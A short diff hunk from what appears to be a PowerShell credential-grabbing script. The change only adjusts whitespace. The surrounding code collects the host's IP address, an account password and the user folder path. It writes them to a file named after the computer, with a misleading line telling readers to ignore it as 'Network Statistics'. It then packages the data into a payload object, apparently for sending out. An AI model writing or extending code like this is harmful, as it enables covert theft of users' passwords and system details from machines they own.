@@ -45,7 +45,7 @@ IP = $ip
 Account Password = $pword
 "
 New-Item ./$env:computername.fk -Value (
-  $ip, $pWord, "C:/Users/$uName", "Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine
+  $ip,$pWord,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine
 )
 $payload = [PSCustomObject]@{content=$description}
 
